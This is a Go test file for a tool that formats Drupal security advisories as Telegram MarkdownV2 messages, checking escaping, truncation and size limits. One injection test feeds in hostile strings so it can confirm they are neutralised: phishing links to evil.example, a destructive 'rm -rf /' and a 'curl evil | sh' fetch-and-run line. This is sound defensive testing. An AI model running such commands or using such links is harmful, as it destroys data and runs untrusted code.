package drupalsec

import (
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/olegiv/it-digest-bot/internal/telegram"
)

// unescapedSpecial finds a MarkdownV2 special character that is not preceded
// by a backslash, after inline code and links have been removed from the
// text (those constructs legitimately contain unescaped characters).
var (
	unescapedSpecial = regexp.MustCompile(`(^|[^\\])[_\[\]()~>#+\-=|{}.!]`)
	codeOrLink       = regexp.MustCompile("`[^`]*`|\\[[^\\]]*\\]\\([^)]*\\)")
)

func assertEscaped(t *testing.T, text string) {
	t.Helper()
	plain := codeOrLink.ReplaceAllString(text, "")
	if m := unescapedSpecial.FindString(plain); m != "" {
		t.Errorf("unescaped MarkdownV2 character %q in:\n%s", m, text)
	}
}

func sampleAdvisory() *Advisory {
	return &Advisory{
		GUID:               "3623987 at https://www.drupal.org",
		ID:                 "SA-CONTRIB-2026-184",
		Kind:               KindContrib,
		Title:              "Tawk.to - Live chat application - Critical - Cross Site Request Forgery - SA-CONTRIB-2026-184",
		Link:               "https://www.drupal.org/sa-contrib-2026-184",
		Published:          time.Date(2026, 9, 23, 17, 14, 48, 0, time.UTC),
		ProjectName:        "Tawk.to - Live chat application",
		ProjectMachineName: "tawk_to",
		RiskLabel:          "Critical",
		RiskScore:          "16/25",
		RiskVector:         "AC:Basic/A:None/CI:Some/II:Some/E:Theoretical/TD:All",
		Vulnerability:      "Cross Site Request Forgery",
		AffectedVersions:   "<3.0.4",
		CVEs:               []string{"CVE-2026-96388"},
		Description:        "This module provides integration.\nThe module does not sufficiently validate certain requests.",
		Solution:           "Install the latest version:\n• Upgrade to tawk.to 3.0.4.\nAfter updating, clear the Drupal cache.",
	}
}

func TestFormatAdvisoryContainsKeyParts(t *testing.T) {
	t.Parallel()
	msg := FormatAdvisory(sampleAdvisory())
	for _, want := range []string{
		"🔴 *Drupal security advisory* — SA\\-CONTRIB\\-2026\\-184\n",
		"*Tawk\\.to \\- Live chat application* \\(`tawk_to`\\)\n",
		"Risk: *Critical* 16/25\n",
		"Vulnerability: Cross Site Request Forgery\n",
		"Affected versions: `<3.0.4`\n",
		"CVE: CVE\\-2026\\-96388\n",
		"Published: 2026\\-09\\-23 17:14 UTC\n",
		"\nThis module provides integration\\.\n",
		"🛠 *Solution*\nInstall the latest version:\n• Upgrade to tawk\\.to 3\\.0\\.4\\.\n",
		"🔗 [Advisory](https://www.drupal.org/sa-contrib-2026-184)\n\n\\#Drupal \\#Security",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("message missing %q\n%s", want, msg)
		}
	}
	assertEscaped(t, msg)
	if len(msg) > telegram.MaxMessageBytes {
		t.Errorf("message too long: %d bytes", len(msg))
	}
}

func TestFormatAdvisoryRiskEmoji(t *testing.T) {
	t.Parallel()
	for label, emoji := range map[string]string{
		"Highly critical":     "🔴",
		"Critical":            "🔴",
		"Moderately critical": "🟠",
		"Less critical":       "🟡",
		"Not critical":        "⚪",
		"":                    "🛡️",
	} {
		a := sampleAdvisory()
		a.RiskLabel = label
		if msg := FormatAdvisory(a); !strings.HasPrefix(msg, emoji+" *Drupal security advisory*") {
			t.Errorf("risk %q: message starts with %q", label, msg[:30])
		}
	}
}

func TestFormatAdvisoryOmitsEmptyFields(t *testing.T) {
	t.Parallel()
	a := &Advisory{
		GUID: "1 at x", ID: "SA-CONTRIB-2026-001", Kind: KindContrib,
		Title: "Thing - Less critical - Bug - SA-CONTRIB-2026-001", Link: "https://www.drupal.org/sa-contrib-2026-001",
		ProjectName: "Thing", RiskLabel: "Less critical",
	}
	msg := FormatAdvisory(a)
	for _, absent := range []string{"Vulnerability", "Affected", "CVE", "Published", "Solution"} {
		if strings.Contains(msg, absent) {
			t.Errorf("message should omit %q when empty:\n%s", absent, msg)
		}
	}
	if !strings.Contains(msg, "Risk: *Less critical*\n") {
		t.Errorf("risk without score rendered wrongly:\n%s", msg)
	}
	if !strings.Contains(msg, "*Thing*\n") || strings.Contains(msg, "\\(`") {
		t.Errorf("project without machine name rendered wrongly:\n%s", msg)
	}
	assertEscaped(t, msg)
}

func TestFormatAdvisoryFallbacks(t *testing.T) {
	t.Parallel()
	a := &Advisory{GUID: "8000003 at https://www.drupal.org", Kind: KindOther, Title: "Link Only", Link: "https://www.drupal.org/node/8000003"}
	msg := FormatAdvisory(a)
	if !strings.Contains(msg, "— nid\\-8000003\n*Link Only*\n") {
		t.Errorf("fallbacks to guid-derived version and title missing:\n%s", msg)
	}

	b := sampleAdvisory()
	b.ProjectMachineName = b.ProjectName
	if msg := FormatAdvisory(b); strings.Contains(msg, "\\(`Tawk") {
		t.Errorf("machine name equal to project name should not repeat:\n%s", msg)
	}
}

func TestFormatAdvisoryPSA(t *testing.T) {
	t.Parallel()
	a := &Advisory{
		GUID: "1 at x", ID: "PSA-2026-09-21", Kind: KindPSA,
		Title:       "Upcoming critical contributed project security release on September 23, 2026 - PSA-2026-09-21",
		Link:        "https://www.drupal.org/psa-2026-09-21",
		Published:   time.Date(2026, 9, 21, 9, 56, 9, 0, time.UTC),
		Description: "There will be a security release.",
		Solution:    "Plan to update.",
	}
	msg := FormatAdvisory(a)
	if !strings.HasPrefix(msg, "📢 *Drupal PSA* — PSA\\-2026\\-09\\-21\n*Upcoming critical contributed project security release on September 23, 2026*\nPublished:") {
		t.Errorf("PSA header wrong:\n%s", msg)
	}
	for _, absent := range []string{"Risk", "Vulnerability", "Affected", "CVE"} {
		if strings.Contains(msg, absent) {
			t.Errorf("PSA message should not contain %q:\n%s", absent, msg)
		}
	}
	assertEscaped(t, msg)
}

func TestFormatAdvisoryTruncatesLongContent(t *testing.T) {
	t.Parallel()
	a := sampleAdvisory()
	a.Description = strings.Repeat("Sentence number one is here. ", 60)
	a.Solution = ""
	for i := range 20 {
		a.Solution += "• line " + string(rune('a'+i)) + "\n"
	}
	msg := FormatAdvisory(a)
	if !strings.Contains(msg, "…") {
		t.Error("long description should be truncated with an ellipsis")
	}
	if !strings.Contains(msg, "… \\(14 more lines\\)") {
		t.Errorf("solution overflow marker missing:\n%s", msg)
	}
	if got := strings.Count(msg, "• line"); got != MaxSolutionLines {
		t.Errorf("solution lines = %d, want %d", got, MaxSolutionLines)
	}
	if len(msg) > telegram.MaxMessageBytes {
		t.Errorf("message too long: %d bytes", len(msg))
	}
}

func TestFormatAdvisoryNeverExceedsTelegramLimit(t *testing.T) {
	t.Parallel()
	a := sampleAdvisory()
	// Long lines defeat TruncateMarkdownV2's paragraph preference and the
	// solution cap counts lines, not bytes: the size guard must kick in.
	a.Description = strings.Repeat("x", 3000)
	a.Solution = strings.Repeat("• "+strings.Repeat("y", 900)+"\n", 6)
	msg := FormatAdvisory(a)
	if len(msg) > telegram.MaxMessageBytes {
		t.Fatalf("message too long: %d bytes", len(msg))
	}
	if !strings.Contains(msg, "🔗 [Advisory](") || !strings.Contains(msg, "SA\\-CONTRIB\\-2026\\-184") {
		t.Errorf("header and link must survive the size guard:\n%s", msg)
	}
}

// TestFormatAdvisoryNeutralisesMarkupInFeedText guards against feed-controlled
// text becoming live MarkdownV2: an attacker who controls the upstream (or a
// custom feed_url) must not be able to plant links or code spans.
func TestFormatAdvisoryNeutralisesMarkupInFeedText(t *testing.T) {
	t.Parallel()
	a := sampleAdvisory()
	a.Title = "Evil [click here](https://evil.example/login) - PSA-2026-01-01"
	a.ProjectName = "Mod `rm -rf /` ule"
	a.Vulnerability = "[XSS](tg://user?id=1)"
	a.RiskLabel = "Critical [x](y)"
	a.Description = "See [update now](https://evil.example/login) and `code` here."
	a.Solution = "[fix](tg://user?id=1)\n```\ncurl evil | sh\n```"
	a.CVEs = []string{"CVE-2026-1 [z](w)"}

	msg := FormatAdvisory(a)

	for _, live := range []string{
		"[click here](", "[update now](", "[XSS](", "[x](", "[fix](", "[z](",
		"`code`", "`rm -rf /`", "```",
	} {
		if strings.Contains(msg, live) {
			t.Errorf("feed text rendered as live markup %q:\n%s", live, msg)
		}
	}
	// The only link allowed is the advisory link we build ourselves.
	if got := strings.Count(msg, "]("); got != 1 {
		t.Errorf("link count = %d, want exactly the 🔗 Advisory link:\n%s", got, msg)
	}
	// Only our own code spans (machine name, affected versions) may carry
	// live backticks; every backtick from feed text must be escaped.
	if live := strings.Count(msg, "`") - strings.Count(msg, "\\`"); live != 4 {
		t.Errorf("live backticks = %d, want 4 (two code spans):\n%s", live, msg)
	}
	assertEscaped(t, msg)

	notice := FormatSeedNotice(3, a)
	if strings.Contains(notice, "[click here](") || strings.Count(notice, "](") != 1 {
		t.Errorf("seed notice leaked feed markup:\n%s", notice)
	}
}

// TestFormatAdvisoryBoundsHeaderFields makes the size guarantee real for
// header fields, not just description and solution: an item with every field
// oversized must still render under the Telegram limit with a usable link.
func TestFormatAdvisoryBoundsHeaderFields(t *testing.T) {
	t.Parallel()
	a := sampleAdvisory()
	big := strings.Repeat("v.", 2500) // 5000 bytes, every '.' escapes to 2 bytes
	a.ID = "SA-CONTRIB-2026-" + strings.Repeat("9", 3000)
	a.Title = big
	a.ProjectName = big
	a.ProjectMachineName = strings.Repeat("m_", 2500)
	a.RiskLabel = big
	a.RiskScore = big
	a.Vulnerability = big
	a.AffectedVersions = strings.Repeat("<1.0, ", 800)
	a.CVEs = make([]string, 300)
	for i := range a.CVEs {
		a.CVEs[i] = "CVE-2026-100000"
	}
	a.Link = "https://www.drupal.org/" + strings.Repeat("x", 3000)
	a.Description = big
	a.Solution = big

	msg := FormatAdvisory(a)
	if len(msg) > telegram.MaxMessageBytes {
		t.Fatalf("message too long: %d bytes", len(msg))
	}
	if !strings.Contains(msg, "🔗 [Advisory](https://www.drupal.org/security)") {
		t.Errorf("oversized link must fall back to the security page:\n%s", msg)
	}
	if strings.Count(msg, "…") < 6 {
		t.Errorf("expected capped fields to carry an ellipsis:\n%s", msg)
	}
	assertEscaped(t, msg)

	psa := sampleAdvisory()
	psa.Kind, psa.ID, psa.Title = KindPSA, "PSA-2026-01-01", big
	if m := FormatAdvisory(psa); len(m) > telegram.MaxMessageBytes {
		t.Errorf("PSA message too long: %d bytes", len(m))
	}

	notice := FormatSeedNotice(50, a)
	if len(notice) > telegram.MaxMessageBytes {
		t.Errorf("seed notice too long: %d bytes", len(notice))
	}
	assertEscaped(t, notice)
}

func TestCapField(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name, in string
		max      int
		want     string
	}{
		{name: "short unchanged", in: "abc", max: 10, want: "abc"},
		{name: "exact unchanged", in: "abc", max: 3, want: "abc"},
		{name: "plain cut", in: "abcdefgh", max: 6, want: "abc…"},
		{name: "no dangling backslash", in: `abc\.def`, max: 7, want: "abc…"},
		{name: "escaped backslash pair kept", in: `ab\\cdef`, max: 7, want: `ab\\…`},
		{name: "rune boundary", in: "ééééé", max: 6, want: "é…"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got := capField(tc.in, tc.max)
			if got != tc.want {
				t.Errorf("capField(%q, %d) = %q, want %q", tc.in, tc.max, got, tc.want)
			}
			if len(got) > tc.max {
				t.Errorf("capField(%q, %d) is %d bytes", tc.in, tc.max, len(got))
			}
		})
	}
}

func TestFormatSeedNotice(t *testing.T) {
	t.Parallel()
	msg := FormatSeedNotice(50, sampleAdvisory())
	for _, want := range []string{
		"🛡️ *Drupal security advisories* are now tracked here\\.",
		"Recorded 50 advisories currently listed on drupal\\.org as the baseline \\(newest: SA\\-CONTRIB\\-2026\\-184, 2026\\-09\\-23\\)\\.",
		"New core, contributed\\-project and PSA advisories will be posted as they are published\\.",
		"🔗 [drupal\\.org/security](https://www.drupal.org/security)",
		"\\#Drupal \\#Security",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("seed notice missing %q:\n%s", want, msg)
		}
	}
	assertEscaped(t, msg)

	single := FormatSeedNotice(1, nil)
	if !strings.Contains(single, "Recorded 1 advisory currently") || strings.Contains(single, "newest") {
		t.Errorf("single/nil notice wrong:\n%s", single)
	}
}
